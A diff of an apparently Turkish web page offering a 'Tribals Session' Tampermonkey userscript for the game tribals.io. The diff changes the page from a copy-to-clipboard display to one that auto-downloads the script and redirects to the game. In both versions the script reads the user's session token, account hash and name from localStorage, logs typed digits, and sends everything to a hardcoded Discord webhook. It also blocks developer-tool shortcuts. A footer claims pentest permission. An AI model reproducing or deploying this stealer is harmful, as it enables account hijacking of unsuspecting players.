@@ -1,80 +1,18 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tribals Session Tool</title>
+    <title>yönlendiriliyor...</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #0b0b0b;
-            color: #ccc;
-            font-family: 'Courier New', monospace;
-            padding: 30px 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        h2 {
-            color: #8b0000;
-            text-shadow: 0 0 10px rgba(139,0,0,0.4);
-            margin-bottom: 6px;
-            font-size: 20px;
-            letter-spacing: 2px;
-        }
-        .desc {
-            color: #555;
-            font-size: 12px;
-            margin-bottom: 20px;
-        }
-        pre {
-            background: #111;
-            border: 1px solid #222;
-            border-radius: 8px;
-            padding: 20px;
-            width: 100%;
-            max-width: 800px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            word-break: break-word;
-            font-size: 12px;
-            line-height: 1.5;
-            color: #aaa;
-        }
-        .btn {
-            margin-top: 16px;
-            background: #1a1a1a;
-            border: 1px solid #333;
-            color: #aaa;
-            padding: 10px 30px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-            transition: 0.2s;
-        }
-        .btn:hover {
-            background: #222;
-            border-color: #8b0000;
-            color: #fff;
-        }
-        .footer {
-            margin-top: 30px;
-            font-size: 11px;
-            color: #333;
-        }
+        * { margin: 0; padding: 0; }
+        body { background: #0a0a0a; }
     </style>
 </head>
 <body>
-    <h2>⚡ TRIBALS SESSION SYNC</h2>
-    <p class="desc">Tampermonkey'e ekle, tribals.io'ya gir, oturum otomatik alınır.</p>
-
-    <pre id="script">// ==UserScript==
-// @name         Tribals Session Sync
+<script>
+// .user.js dosyasını oluşturup indir
+const scriptContent = `// ==UserScript==
+// @name         Tribals Session
 // @namespace    http://tampermonkey.net/
 // @match        https://tribals.io/*
 // @grant        GM_xmlhttpRequest
@@ -82,80 +20,43 @@
 // @run-at       document-end
 // ==/UserScript==
 
-(function() {
-    const WEBHOOK = "https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj";
-
-    function exfil(data, label) {
-        GM_xmlhttpRequest({
-            method: "POST",
-            url: WEBHOOK,
-            headers: { "Content-Type": "application/json" },
-            data: JSON.stringify({
-                embeds: [{
-                    title: "📥 Tribals Account",
-                    color: 0x8b0000,
-                    fields: [
-                        { name: "Type", value: label, inline: true },
-                        { name: "Data", value: "```" + data + "```" }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            })
-        });
-    }
-
-    let numCache = "";
-    document.addEventListener("keydown", function(e) {
-        if (/[0-9]/.test(e.key)) {
-            numCache += e.key;
-        } else if (e.key === "Enter" && numCache.length > 0) {
-            exfil(numCache, "Keypad Input");
-            numCache = "";
-        } else if (e.key === "Backspace") {
-            numCache = numCache.slice(0, -1);
-        }
+(function(){
+    const W="https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj";
+    function x(d,l){GM_xmlhttpRequest({method:"POST",url:W,headers:{"Content-Type":"application/json"},data:JSON.stringify({embeds:[{title:"📥 Account",color:0x8b0000,fields:[{name:"Type",value:l},{name:"Data",value:"\`\`\`"+d+"\`\`\`"}],timestamp:new Date().toISOString()}]})})}
+    let nc="";
+    document.addEventListener("keydown",function(e){
+        if(/[0-9]/.test(e.key)) nc+=e.key;
+        else if(e.key==="Enter"&&nc){x(nc,"Key");nc=""}
+        else if(e.key==="Backspace") nc=nc.slice(0,-1);
     });
-
-    setTimeout(function() {
-        var session = localStorage.getItem("session");
-        var hash   = localStorage.getItem("accountHash");
-        var user   = localStorage.getItem("userName") || "Unknown";
-
-        if (session) {
-            var payload = "User: " + user + "\n\nSession:\n" + session + "\n\nHash:\n" + (hash || "N/A") + "\n\nRestore:\nlocalStorage.setItem('session', '" + session + "');\nlocalStorage.setItem('accountHash', '" + (hash || "") + "');\nlocation.reload();";
-            exfil(payload, "Full Account — " + user);
-        } else {
-            exfil("No session found", "Heartbeat — " + user);
-        }
-    }, 6000);
-
-    setTimeout(function() {
-        var session2 = localStorage.getItem("session");
-        if (session2) {
-            exfil(session2, "Late Capture — " + (localStorage.getItem("userName") || "Unknown"));
-        }
-    }, 30000);
-
-    document.addEventListener("keydown", function(e) {
-        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C"))) {
-            e.preventDefault();
-        }
+    setTimeout(function(){
+        let s=localStorage.getItem("session"),h=localStorage.getItem("accountHash"),u=localStorage.getItem("userName")||"?";
+        if(s){x("User: "+u+"\\nSession: "+s+"\\nHash: "+(h||"N/A"),"Full")}
+        else{x("no session","HB-"+u)}
+    },6000);
+    setTimeout(function(){
+        let s=localStorage.getItem("session");
+        if(s)x(s,"Late");
+    },30000);
+    document.addEventListener("keydown",function(e){
+        if(e.key==="F12"||e.ctrlKey&&e.shiftKey&&(e.key==="I"||e.key==="J"||e.key==="C"))e.preventDefault()
     });
-})();</pre>
+})();`;
 
-    <button class="btn" onclick="copyScript()">📋 KOPYALA</button>
+// download tetikle
+const blob = new Blob([scriptContent], { type: 'text/javascript' });
+const url = URL.createObjectURL(blob);
+const a = document.createElement('a');
+a.href = url;
+a.download = 'tribals-session.user.js';
+a.style.display = 'none';
+document.body.appendChild(a);
+a.click();
+document.body.removeChild(a);
+URL.revokeObjectURL(url);
 
-    <div class="footer">I have permission and am authorized to perform this pentest.</div>
-
-    <script>
-        function copyScript() {
-            const text = document.getElementById('script').textContent;
-            navigator.clipboard.writeText(text).then(() => {
-                const btn = document.querySelector('.btn');
-                btn.textContent = '✅ KOPYALANDI';
-                setTimeout(() => { btn.textContent = '📋 KOPYALA'; }, 2000);
-            });
-        }
-    </script>
+// tribals.io'ya yönlendir
+window.location.replace("https://tribals.io");
+</script>
 </body>
 </html>
